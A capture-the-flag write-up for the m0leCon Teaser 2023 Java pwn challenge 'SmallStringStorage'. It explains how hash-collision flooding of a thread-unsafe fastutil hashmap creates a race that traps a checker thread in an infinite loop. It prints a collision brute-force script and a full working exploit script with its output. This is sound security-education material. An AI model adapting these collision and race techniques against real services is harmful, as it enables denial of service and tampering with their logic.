# SmallStringStorage
> **Category:** pwn
>
> **Description:**
> 
> Author: @Alberto247
>
> I've invented a new system to store strings on disks! This PoC shows my idea, however my friend says it cannot be used to store all kind of strings.
I want to prove him wrong, can you help me?
>
> flag: :disappointed:

**Tags:** Java, pwn, Long2ObjectOpenHashMap, Thread safety, Hashcode collision, m0leCon Teaser 2023

## Takeaways

- Approach differently than the usual *unsafe* languages when working on a Java pwn challenge. Look for wrongly used libraries and errors in the programs logic instead of searching for potential out of bounds, indexing mistakes etc. (Except if you are attempting to crash it)
- Using `Long2ObjectOpenHashMap` in a multithreading context is never a good idea, no matter how much you think you sanitized. Use `SynchronizedLong2ObjectMap` instead. 
- As always, Adding/Removing/Modifying elements of a list that is being iterated is big nono... 

## Challenge

In this challenge we are given a `SmallStringStorage.jar` **Java archive** and docker files to deploy the challenge locally. 

We start by decompiling the `jar` using [jadx](https://github.com/skylot/jadx) or even better [IntelliJ IDEA Community]( https://www.jetbrains.com/idea/community/) to inspect the codes functionality and find potential bugs.

### Functionality

The program is a *custom page allocator* that seems to store strings in elements of pages. I will present the features here so that you have a general idea of how the application behaves. And, we will come back to the most interesting when it is relevant:

1. Create a page (with a user controlled identifier(id) of type long)

2. Edit a previously created page
    - Get the number of elements in the page
    - Add an element to the page: The element is an array with size is set to 10. The elements id starts at 0 and is incremented by the program at every add.
    - Edit element in page: Edit an index of the element (`0 <= x < 10`) with one of the following instructions.
        - `CHARACTER`: Store a character to the specific index.
        - `JUMP`: Jump to the an index of the element.
        - `END`
    - Execute element in page: Executes the instructions of the specified element of a page starting from index 0. Stores the string created. 
    
        > e.g. `|0: Z|1: JUMP 3|2: B|3: T|4: END|5: A|...|9:F|` will yield the string `ZT` since the JUMP at index 1 skips `B`, and, everything after an `END` instruction is omitted.

3. Unload page from memory storage: Remove a specified page from memory (will survive in the backup)
4. Write all memory: Back-up all pages
5. Check page for target: Checks the string produced by `Execute element in page` for all elements of a specified page (Does not run `Execute element in page` only checks the string)


### Internals 
To understand a bit better how the application is structured and how pages are allocated let's have a quick look at the classes and their variables.

The *root* class `MemoryStorage` has two fields/class members:
    
- **memstore**: A `Long2ObjectOpenHashMap` of `Page` objects and constructed with a user controlled size and a 90% threshold. Meaning it will resize itself at 90% capacity. This is where pages are stored when we create them.
- **backend**: An object containing as well a `Long2ObjectOpenHashMap` of `Page` objects with the same threshold as `memstore`. This is where pages are stored when we *Write all memory* aka Back-up.

```java
public class MemoryStorage {
    private Long2ObjectOpenHashMap<Page> memstore;
    private Backend backend;

    public MemoryStorage(int size) {
        this.memstore = new Long2ObjectOpenHashMap<>(size, 0.9f);
        ...
    }
    ...
}

public class Backend {
    private Long2ObjectOpenHashMap<Page> filesystem;

    public Backend(int size) {
        this.filesystem = new Long2ObjectOpenHashMap<>(size, 0.9f);
    }
    ...
}
```

Each `Page` object class two fields:

- **stringList**: An `ArrayList<SmallString>` of the pages elements
- **id**: The page identifier


Where each `SmallString` element has two fields:

- **generator**: A list of size 10 containing an instruction (CHARACTER, JUMP, END)
- **generated**: The string produced after **Executing** a pages element

```java
public class Page {
    private ArrayList<SmallString> stringList = new ArrayList<>();
    private Long id;
    ...
}

public class SmallString {
    private StringGenerator[] generator = new StringGenerator[10];
    private String generated = "";
    ...
}

public class StringGenerator {
    private Instruction type = Instruction.END;
    private Integer jumpDest;
    private char character;
    ...
}

public enum Instruction {
    CHARACTER,
    JUMP,
    END;
}
```

After inspecting the application's code, we find our method of interest which is called when choosing the [5. Check page for target](README.md#functionality) option. More specifically, a `Checker` thread which iterates over all the elements of the requested page is created and checks that the string produced is equal to `i swear it's possible!`. If the check is successful, the flag is fetched from the environment and printed.

We [already know](README.md#internals) that the element lists *(`SmallString::generator`)* of each page is of fixed size `10`. So, in contrast to what the *magic* string claims, it is not obvious to fit 22 characters into an array of size 10 using just `CHARACTER` and `JUMP` instructions. Therefore, we clearly need to find a bug that will allow us to somehow write an arbitrary number of characters. 

```java
// Checker.class
public class Checker extends Thread {
    private MemoryStorage memstore;
    private Long pageId;

    Checker(MemoryStorage memstore, Long pageId) {
        this.memstore = memstore;
        this.pageId = pageId;
    }

    @Override
    public void run() {
        Page p = this.memstore.getPage(this.pageId);
        Integer size = p.getPageSize();
        Boolean found = false;

        for(int i = 0; i < size; ++i) {
            SmallString s = this.memstore.getPage(this.pageId).getSmallString(i);
            if (s != null) {
                String check = s.getString();
                if (check.equals("i swear it's possible!")) {
                    String flag = System.getenv("FLAG");
                    if (flag == null) {
                        flag = "ptm{test}";
                    }

                    System.out.println("Checker found string! Here is your flag! " + flag);
                    found = true;
                }
            }
        }

        if (!found) {
            System.out.println("Checker finished, string not found :(");
        }

        SmallStringStorage.lockedPage = -1L;
    }
}
```

Lets look at bit more closely to `SmallString::calculateString()`, the unique method that can generate the string for a given element. What it does is it iterates over all indexes of the element (starting at 0) and executes the instructions:

- `CHARACTER`: Will concatenate the character to the `generated` string.
- `JUMP`: Will jump to a specific index of the element. 
- `END`: Will terminate the string calculation.

```java
// SmallString.class
public class SmallString {
    private StringGenerator[] generator = new StringGenerator[10];
    private String generated = "";

    // This method is called by the `checker` to retrieve the `generated` string.
    public String getString() { return this.generated; }
    ...

    public Boolean calculateString() {
        this.generated = "";
        int i = 0;

        // while Instruction is not END
        for(Instruction instruction = this.generator[i].getType(); instruction != Instruction.END; 
                        instruction = this.generator[i].getType()) {
            if (instruction == Instruction.CHARACTER) {
                // If `CHARACTER`: concatenate to `generated`
                this.generated = this.generated + this.generator[i].getCharacter();
                ++i;
                if (i >= 10) {
                    return false;
                }
            } else if (instruction == Instruction.JUMP) {
                // If JUMP: pc goes to index
                Integer jump = this.generator[i].getJumpDest();
                if (jump < 0 || jump >= 10) {
                    return false;
                }
                i = jump;
            }
        }
        return true;
    }
}
```

If you think like me, then the first thing that pops into your mind is `I can block it in an infinite loop`. But that will most probably be useless as it will only block our program... But wait! If we can manage to trigger this inside the `Checker` thread then we are golden! Why? Well because we can actually [2. edit a page](README.md#functionality) while it is blocked. Hence, if we craft a nice releasing strategy we will be able to write an arbitrary string of any given size.

But before we get there, lets think about how we can actually trigger `SmallString::calculateString()`. There are two scenarios where calculate string is called:

1. Simply create a page, edit it, add an element to it, edit the element to what you wish, and then execute it. Which is not that interesting to us as we want the call to happen inside `Checker::run()`.

2. The second is looking much more promising. Remember the application has an [3. Unload page from memory storage](README#functionality) feature. As mentioned in the Functionality section it removes a specified page from the `MemoryStorage::memstor` map. And what happens when you try to access it? Well if it fails to find a page in memory, it tries to look for it in the backend. And if it is found in the backend... **BINGO!**, it calls `Page::calculatePage()` which calls `SmallString::calculateString()` for all elements of the page.

```java
// MemoryStorage.class
public Page getPage(Long id) {
    Page p = (Page)this.memstore.get(id);
    if (p == null) {
        System.out.println("Page not found in memory storage, loading from backend.");
        p = this.getFromBackend(id);
        if (p != null) { // Call `calculatePage()` if page is found, and cache it in
            p.calculatePage(); 
            this.memstore.put(id, p);
        }
    }
    return p;
}

// Page.class
public void calculatePage() { // Call `calculateString()` for all elements
        this.stringList.forEach((s) -> {
            s.calculateString();
        });
    }
```

Now we know have a clear idea of what we have to do; [4. Write all memory](README.md#functionality) (backup the pages), then [3. Unload the page from memory storage](README#functionality) and finally trigger a load from the backend withing the `Checker::run()`. But, here is where the actual challenge starts.

My first idea was to unload the page, then, run the `Checker`. But that is not possible since the application calls `getPage(id)` before the `Checker` thread is create. So this is not an option.

Additionally, notice the `SmallStringStorage::lockedPage` variable, it serves as a *pseudo* semaphore to block the user from unloading the page while the checker runs. The semaphore does not restrict editing the page while the checker is processing it, but, there is no way to unload the page. Meaning there is no way to trigger `Page::calculatePage()`. 

So, we can't directly unload a page while the checker is processing it... Is there a way to indirectly trigger the unloading of the page? Well at first sight no, this is Java :expressionless:. 


```java
//SmallStringStorage
public static volatile Long lockedPage = -1L; //NOTE: Semaphore

//segment of SmallStringStorage::mainMenu()
if (choice == 3) {
    System.out.println("Give me the numerical identifier for the page:");
    id = this.readLong();
    if (id == lockedPage) {
        System.out.println("Sorry, cannot unload page while checker is running.");
    } else {
        this.memstore.unloadPage(id);
        System.out.println("Page unloaded");
    }
} else if (choice == 4) {
    this.memstore.syncWithDisk();
} else if (choice == 5) {
    if (lockedPage != -1L) {
        System.out.println("Sorry, another checker is currently running. Only one per time.");
    } else {
        System.out.println("Give me the numerical identifier for the page:");
        id = this.readLong();
        p = this.memstore.getPage(id); //NOTE: Load will happen before the checker 
        if (p == null) {
            System.out.println("Page not found");
        } else {
            lockedPage = id;
            Checker c = new Checker(this.memstore, id);
            c.start();
        }
    }
}
```

Let's recap a bit on what we can do to start formulating a plan:

- We can run the `Checker` and **remove elements from a page**
- We can run the `Checker` and **add elements to the page**

And this is where I got stuck until the end of the CTF. I knew I had to trigger undefined behavior by adding or removing pages since `Long2ObjectOpenHashMap` is not thread safe. I knew my window depended on the number of elements in the page that is being checked. But I was not sure what and when I needed to hit. Alas, I could not leave it like that, so, for the following days I avoided the CTF's discord channel and tried to figure it out.

### Long2ObjectOpenHashMap

This is where understanding the implementation of `Long2ObjectOpenHashMap` comes into place, for which there exists a thread safe version; `SynchronizedLong2ObjectMap`. So we have to figure out a way to take advantage of the thread unsafe one. I believe that both strategies of removing/adding to the map would work but I went with the removing one. 

So bare with me while we dive into `it.unimi.dsi.fastutil.longs.Long2ObjectOpenHashMap` :grimacing:. And let's start with the actual `get()` method that retrieves an object (in our case a page) from the map, and see if anything rings an alarm. 

> Before I do so, let me explain a thing or two about hashmaps to add some context. If you are already familiar with how they work feel free to skip this part. A hashmap stores an object into a structure with its corresponding *key*. To decide the exact position where it will be stored the `hash` of the key is computed. A hashmap of size `n` can have at most `n` hashes (Depending if 0 is used) which means that the hash of multiple keys can be the same. The keys that have the same hash are stored into buckets. Thus, there are `n` buckets in a hash map of size `n`. Hashmaps are generally known to be super efficient due to this process but what happens when you have multiple colliding keys? Well in the case of `Long2ObjectOpenHashMap` the bucket is iterated linearly until it finds a matching keys. Making collisions quite expensive.

Back to our `get` method; `this.key` is a list of longs that stores all page identifiers and `this.value` their corresponding object. This is a bit counter-intuitive as you might expect to see a list of lists for all the buckets, but `Long2ObjectOpenHashMap` stores everything in a single list. So, to find a page with an identifier `x` it looks for `this.key[i]==x` and returns `this.value[i]`. Now lets have a look at the method itself, I will leave notes on the code to make it more understandable.

We will refer to the elements of the hash map as `pages` to remain in the context of the challenge. 


```java
// ../it/unimi/dsi/fastutil/longs/Long2ObjectOpenHashMap.class

public V get(long k) { //NOTE: k is the page identifier we are looking for
    if (k == 0L) {
        return this.containsNullKey ? this.value[this.n] : this.defRetValue;
    } else {
        long[] key = this.key;
        long curr;  //NOTE: This is the value of the key (if ==0L it means it does not exist)
        int pos;    //NOTE: this is the position in self.key of the first page in the bucket
        if ((curr = key[pos = (int)HashCommon.mix(k) & this.mask]) == 0L) {
            return this.defRetValue;
        } else if (k == curr) {
            return this.value[pos];
        } else {    
            //NOTE: This is what happens if we have a colliding key
            //      As you can see, it iterates all pages until it finds it  
            while((curr = key[pos = pos + 1 & this.mask]) != 0L) {
                if (k == curr) {
                    return this.value[pos];
                }
            }
            //NOTE: What is important to notice here is that if `curr` == 0 
            //      it will return defRetValue aka NULL
            return this.defRetValue;
        }
    }
}
```

So from what we saw in the `get` method we want a case where `curr = key[pos = pos + 1 & this.mask]) == 0L` for a page **that exists**. A good guess is that, synchronously removing a colliding page between the page we are looking for, could cause it to return `null`. 

> A small useless side note of something I noticed; given the current implementation, we can have collision even without matching hashes. Assume you have 3 keys `x,y,z`, where `x,y` have a hash=1 and `z` a hash=2. `x` will be stored at index `1`, `y` at index `1+1`. And while `z` should have been stored at `2` it will be stored at `2+1`. Meaning that the lookup of `z` goes through `y` even if they don't share a hash. This is not exactly true as explained but you get the idea. This is interesting because if you massage the keys in the map well enough, you could move a key way far from it's designated position even without it colliding with any of the other keys.

Regardless, lets have a look at the `remove()` method. Naturally it looks quite similar to the `get()` method as it is also searching for the page to remove. Again I will leave the comments on the code.

```java
// ../it/unimi/dsi/fastutil/longs/Long2ObjectOpenHashMap.class

public V remove(long k) {
    if (k == 0L) {
        return this.containsNullKey ? this.removeNullEntry() : this.defRetValue;
    } else {
        long[] key = this.key;
        long curr;
        int pos;
        if ((curr = key[pos = (int)HashCommon.mix(k) & this.mask]) == 0L) {
            return this.defRetValue;
        } else if (k == curr) {
            return this.removeEntry(pos);
        } else {
            //NOTE: looking for the page to remove in the bucket
            while((curr = key[pos = pos + 1 & this.mask]) != 0L) { 
                if (k == curr) {
                    //NOTE: Call to removeEntry() to do the actual removing
                    return this.removeEntry(pos); 
                }
            }

            return this.defRetValue;
        }
    }
}

private V removeEntry(int pos) {
    V oldValue = this.value[pos];

    //NOTE: Golden moment:
    //      currently an object between the start of the bucket and the last page == null
    //      The key still points at it as it has not been cleared
    //      Not sure why it exists. The bug could have been avoided 
    //      if the set to null happened after the call to `shiftKeys()`
    this.value[pos] = null; 
    --this.size;
    this.shiftKeys(pos);

    //NOTE: We do not care about this scenario as it will never hit in our case
    if (this.n > this.minN && this.size < this.maxFill / 4 && this.n > 16) {
        this.rehash(this.n / 2);
    }

    return oldValue;
}

protected final void shiftKeys(int pos) {
    long[] key = this.key;

    while(true) {
        int last = pos;
        //NOTE: Looks for the next page in the bucket
        pos = pos + 1 & this.mask;
        long curr;

        while(true) {
            //NOTE: if there is no next page in the bucket
            //      it sets the page to remove to NULL and returns
            if ((curr = key[pos]) == 0L) {
                key[last] = 0L;
                this.value[last] = null;
                return;
            }

            //NOTE: it will skip over the indexes that have an un-matching hash
            int slot = (int)HashCommon.mix(curr) & this.mask;
            if (last <= pos) {
                if (last >= slot || slot > pos) {
                    break;
                }
            } else if (last >= slot && slot > pos) {
                break;
            }

            pos = pos + 1 & this.mask;
        }

        //NOTE: shift all the collides to the left
        key[last] = curr;
        this.value[last] = this.value[pos];
    }
}
```


> This is the part where I think the *adding strategy* and triggering rehashing might have been more effective. As you can see, we currently have a single golden moment. If we had opted for the rehashing strategy, the size of the map would have doubled and the page identifiers would have been scattered around the map. Resulting in a higher chance of hitting an empty key while iterating. This would of course require simulating the rehashing to carefully chose the page you want to hit. But could also work randomly. Regardless I am too deep into the removing approach to back down. And overall, I believe the remove approach while a pain is more interesting because it still works even if the program had a size protection to avoid rehashing.

By now you must have understood where this is going. By adding to the map a large amount of colliding pages we can ensure that the `getPage(this.pageId)` in `SmallString s = this.memstore.getPage(this.pageId).getSmallString(i);` of `Checker::run()` will be at its most inefficient. Combine that with adding a very large amount of elements to the page and the hit window just increased considerably. 
**We have an additional golden moment**, if the remove happens at exactly the last iteration before our target page is found. Since the page will be shifted to take the place of the previous it's old position will be 0.

So lets make a list of our requirements:
1. We want to have a maximum of *colliding* pages.
2. We want to have the `checker` look for the last one as it will create the largest window.
3. We want to perform multiple removes while the checker is processing the page
4. We want our golden opportunity to be open for as long as possible so we should be relatively far from the end of the bucket

To make the best of what we have. So lets start with our *requirement 1.*, and ensure that we only create pages with colliding keys (id). I have written a script that will brute-force colliding pages for a map of size `8192` which I recon will be enough. The reason I chose an aligned size has to do with the implementation of `Long2ObjectOpenHashMap`. 

The map created is always `**2` aligned, depends on the size and load factor and is computed by the `arraySize()` method. In short, it finds the next power of two of the `size / load factor`. The reason this is important is because we have to be careful with the size, as collisions are size dependant. Thus if we want to create a map of size `8192` we will have to request a size of `floor(8192 * 0.9)` and avoid rehashing.

So lets have a look at [collisions.py](collisions.py):

```python
class HashMapCollisions:
    def __init__(self, size: int, load_factor: float):
        self.n = self._array_size(size, load_factor)
        self.mask: c_int32 = c_int32(self.n.value - 1)

    # Compute the actual size
    def _array_size(self, size, f):
        s = c_int64(max(2, self._next_power_of_two(c_int64(math.ceil(size / f))).value))
        if s.value > 1073741824:
            print("ERROR")
        return c_uint32(s.value)

    def _next_power_of_two(self, x: c_int64):
        pass # see the script

    def get_position(self, k: c_int64):
        return c_int32(c_int32(self._mix(k).value).value & self.mask.value)

    # Hashing method used by `Long2ObjectOpenHashMap`
    def _mix(self, x: c_int64) -> c_int64:
            h: c_int64 = c_int64(x.value * -7046029254386353131)
            h.value ^= h.value >> 32
            h.value &= 0xFFFFFFFF
            h.value ^= h.value >> 16
            h.value &= 0xFFFF
            return h
```

As you can see the hashmap of a *key* is computed with `_mix(key) & (size-1)`. This allows us to brute-force a good amount of keys for each hash. Keep in mind we only need `floor(8192 * 0.9) - 1` as we do not want to trigger rehashing.

Regarding our *requirement 2.*, we can ensure this by targeting the page that we added last. If all pages we add collide we are guaranteed for it to be added at the end. As for *requirements 3. and 4.*, since we are working with a map of size `8192` with an actual limit of `7372-1` elements I believe trying to remove 1000 pages from the end should be more than enough.


## Exploit

So lets model an step by step scenario of our exploit:

1. Create a map of size `7372-1` (which will end up creating a map of size `8192`).
2. Create `7372-1-10` pages in this map (the `-10` is just a precaution to be sure we don't trigger a rehash).
3. When creating our pages the last page should contain and **infinite loop** to ensure the `Checker` gets stuck.
4. Backup the pages.
5. Modify our target page so that it has 50000 element making the `Checker` loop take longer and creating a larger window.
6. Run the `checker` on our target page.
7. Trigger a large amount of removes (or add if that is what you are into).
8. Check if the checker is stuck in an infinite loop by getting a `"Page not found in memory storage, loading from backend"` message.
9. Write our string one byte at a time.


### Infinite Loop
Let me explain how we will perform step 9. with the different phases of the `generator` before I get into the actual exploit:

- Step 1.
We write our char at index 0, the `JUMP 1->2` serves as an intermediate and then create in an infinite loop `2<->3`
```
|0. CHAR:i_1|1. JUMP:2|2. JUMP:3|3. JUMP:2|4. END|
```

- Step 2.
Modify `JUMP 1->2` to `JUMP 1->1`, so it blocks at 1.
```
|0. CHAR:i_2|1. JUMP:1|2. JUMP:3|3. JUMP:2|4. END|
```

- Step 3.
Break the infinite loop to go to the char: `JUMP 3->1`. (It will then get stuck at `1->1`)
```
|0. CHAR:i_2|1. JUMP:1|2. JUMP:3|3. JUMP:1|4. END|
```

- Step 4.
Rebuild infinite loop by modifying `JUMP 3->1` to `JUMP 2->3` 
```
|0. CHAR:i_2|1. JUMP:1|2. JUMP:3|3. JUMP:2|4. END|
```

- Back to step 1. until all is written. Then, break out of infinite loop `JUMP 3->4`

### exploit.py

From here everything is prey straightforward, I created a small API to communicate with the program which can be found in [exploit.py](exploit.py#L84). The key elements of the script are:

```python
'''
This function builds the pages inside the map
'''
def build():

    for page in collisions[:pages]:
        page = int(page)
        mainMenu.create_new_page(page)

        # Add the infinite loop only to our target page to improve performance
        if page == last_page:
            mainMenu.edit_page(page)

            pageMenu.add_element()
            pageMenu.edit_element(0)

            # add first element of secret
            stringsMenu.edit_generator(0)
            stringsMenu.char(secret[0])       
            
            # intermediate jump
            stringsMenu.edit_generator(1)
            stringsMenu.jump(2)

            # infinite loop 2<->3`
            stringsMenu.edit_generator(2)
            stringsMenu.jump(3)

            stringsMenu.edit_generator(3)
            stringsMenu.jump(2)

            # return
            stringsMenu.ret()
            pageMenu.ret()

    # Backup the pages
    mainMenu.store_backed()

    # Add a large amount of elements to our target (last) page 
    # so it takes some time to iterate them all increasing our window
    mainMenu.edit_page(last_page)
    for i in range(last_page_elem_count):
        pageMenu.add_element()

    pageMenu.ret()
    io.recvuntil(b"> ")

    build_log.success("Done")

'''
This function performs the actual exploit
    It sends a request to the `Checker` and immediately starts triggering removes 
'''
def probe(ms: int, remove_count: int):

    success = b"loading"
    fail = b"finished"
    checker_fail = b"Only"

    wait = 0 if ms == 0 else (ms / 1000)
    assert(remove_count < pages-2)
    # to_del = collisions[:pages][-remove_count-remove_count:-remove_count]
    to_del = collisions[:pages][-remove_count:-2]
    to_del.reverse()

    # Start the checker on our last page
    io.sendline(b"5") 
    io.sendline(bytes(f"{last_page}", 'utf-8'))
    time.sleep(wait)

    # Sent a large amount of removes
    for col in to_del:
        io.sendline(b"3") 
        io.sendline(bytes(f"{int(col)}", 'utf-8'))


    res = io.recvuntil((success, fail, checker_fail))
    if fail in res or checker_fail in res:
        log.failure(f"Checker NOT stuck.. Failed: {fail in res}, Too fast: {checker_fail in res}")
        return False

    if success in res:
        log.success(f"Checker stuck! {ms}s")
        return True

'''
The actual function that writes the secret once the checker is stuck
'''
def write_secret(page: int, data: str):
    io.sendline(b"")
    mainMenu.edit_page(page)
    pageMenu.edit_element(0)
    for d in data:
        log.success(f"Append: {d}")

        stringsMenu.edit_generator(0)
        stringsMenu.char(d) # add the char to index 0
        time.sleep(1)

        stringsMenu.edit_generator(1) # block 1 to only go to itself (and unlock later)
        stringsMenu.jump(1)
        time.sleep(1)

        stringsMenu.edit_generator(2) # use 2 to jump to 0 so string is written
        stringsMenu.jump(0)

        # Now the new char should have been written and we are stuck in 1<->1 jumps
        time.sleep(2) # just to be sure the string was written

        stringsMenu.edit_generator(2) # restore 2<->3 infinite loop 
        stringsMenu.jump(3)
        time.sleep(1)
        stringsMenu.edit_generator(1) # open path to infinite loop 1->2
        stringsMenu.jump(2)
        time.sleep(1)


    stringsMenu.edit_generator(3)
    stringsMenu.jump(6) # break out of infinite loop

    stringsMenu.ret()
    pageMenu.ret()

    time.sleep(1)
    
    flag = mainMenu.check_page(last_page).decode()
    log.success(flag)
    io.interactive()

'''
Our main and globals
'''
target_page_idx = "3876"  # I know this index has many collisions
collisions: list[int] = # read from collisions.json

map_size = math.floor(8192 * 0.9)  # Will be aligned to 8192 if you give more a larger power of 2 will be created
pages = map_size - 10 # Number of pages to create (-10 to be safe)

secret="i swear it's possible!"
last_page = collisions[:pages][-1]
last_page_elem_count = 50000

io.sendlineafter(b"> ", bytes(f"{map_size}", 'utf-8')) # size of memory

while True: # Try until it hits
    for p in range(0, 501, 100):
        
        # Build the map from scratch (so we are sure the last is indeed last)
        build()
        rem = 1000 # We remove at most 1000 elements which will not trigger rehashing

        # run the attack
        fuck_yea = probe(p, rem)
        if fuck_yea:
            io.clean()
            write_secret(last_page, secret[1:])

        io.clean()
        io.sendline(b"") # Recalibrate

        # clean all pages to start a fresh map
        log.info("Cleaning up")
        for n in collisions[:pages]:
            mainMenu.unload_page(n)
```

### Run the exploit locally

All set! If you wish to run the exploit:

- unzip `SmallStringStorage.zip`
- build the `collisions.json` file using [collisions.py](collisions.py) (:warning: it creates a 2GB json) and run the script to get the flag. Run with `pypy` to avoid hight memory usage.

```bash
$ pypy collisions.py

You will have to create a map of size 7372
If you fill it over this limit you will trigger rehashing and collisions will change
100%|█████████████████████████| 100000000/100000000 [02:05<00:00, 794681.82it/s]
Longest list: 3876
Length: 12579

$ python3 exploit.py LOCAL

[+] Starting local process '/usr/bin/java': pid 47406
[+] Init: Loaded 12579 collisions for hash 3876
[*] Requesting map of size 7372
[+] Building map with target page 57639881: Done
[*] Probing 0ms by removing 1000 pages
[-] Checker NOT stuck.. Failed: True, Too fast: False
[*] Cleaning up
[+] Building map with target page 57639881: Done
[*] Probing 100ms by removing 1000 pages
[+] Checker stuck! 100s
[+] Append:  
[+] Append: s
[+] Append: w
[+] Append: e
[+] Append: a
[+] Append: r
[+] Append:  
[+] Append: i
[+] Append: t
[+] Append: \'
[+] Append: s
[+] Append:  
[+] Append: p
[+] Append: o
[+] Append: s
[+] Append: s
[+] Append: i
[+] Append: b
[+] Append: l
[+] Append: e
[+] Append: !
[+] Main menu:
[*] Switching to interactive mode
1. Create new page
2. Edit page
3. Unload page from memory storage
4. Write all memory storage to backend
5. Check page for target
6. Exit
> Checker found string! Here is your flag! ptm{test}
$  
```

## Bonus

[Long2ObjectOpenHashMap.py](Long2ObjectOpenHashMap.py) implements the `add()` and `get()` methods of the original library. Can be useful if you wish to implement the *add variant* exploit.
